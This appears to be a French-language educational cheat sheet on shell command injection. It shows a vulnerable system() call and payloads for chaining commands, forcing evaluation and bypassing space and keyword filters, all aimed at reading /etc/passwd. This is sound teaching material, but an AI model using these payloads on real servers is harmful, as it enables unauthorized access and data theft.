<!--- id: intro --->
<!--- category: cmdinjection --->
# Injection de commandes Shell

L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l'afficher.
Le code coté serveur va ressembler à: system ('echo '.$NAME);
Si nous saisissons: YOLO; cat /etc/password;
Le serveur va enchainer les deux commandes en executant system ('echo YOLO; cat /etc/password;'); et nous permettre de récupérer le contenu du fichier passwd.

<!--- id: CommandPrinciple --->
<!--- category: cmdinjection --->
<!--- keywords:  --->
## Command Injection: Principe

L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l'afficher.
Le code coté serveur va ressembler à: 
````system ('echo '.$NAME);
````
Si nous saisissons: 
````YOLO; cat /etc/password;
````
Le serveur va enchainer les deux commandes en executant:
<pre><code>system ('echo YOLO; cat /etc/password;'); 
</code></pre> 
Nous allons récupérer le contenu du fichier passwd.

Avec une injection de commande nous avons la main sur le serveur.
Nous pouvons récupérer des informations sur le serveur (uname -a), recupérer des noms de comptes (cat /etc/passwd), récupérer les fichiers de config du serveur web, lancer un reverse shell...

<!--- id: CommandChainUx --->
<!--- category: cmdinjection --->
<!--- keywords:  --->
## Unix: Enchainer deux commandes shell

Utiliser les séparateurs de commandes ; && | ||
<pre><code>echo YOLO; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Seulement si la première commande est en echec
</code></pre> 

<!--- id: CommandEvalUx --->
<!--- category: cmdinjection --->
<!--- keywords:  --->
## Unix: Force command execution in a string

Il est possible de forcer l'execution d'une commande avec ` $ et {
<pre><code>echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
</code></pre> 

<!--- id: CommandSpaceFilteres --->
<!--- category: cmdinjection --->
<!--- keywords:  --->
## Bypass: Les espaces sont filtrés

Les développeurs peuvent avoir mis des filtres pour empécher l'execution de commande. Par exemple retirer les espaces. Néanmoins, même sans espaces, il est toujours possible de lancer lancer des commandes:
<pre><code>cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
</code></pre> 

<!--- id: CommandBlacklist --->
<!--- category: cmdinjection --->
<!--- keywords:  --->
## Bypass: Certains mot clefs sont filtrés

Si un filtre recherche une liste de commandes, il est toujours possible de le contourner: simple quote, double quote, backslash et slash
<pre><code>c'a't /etc/passwd
cat /etc/passwd
c\at /etc/passwd
who``ami
</code></pre> 
Et si un nom de fichier est filtré, il est possible de multiplier les /
Filtre sur cat et /etc/passwd
<pre><code>c\at /etc////////passwd
</code></pre> 

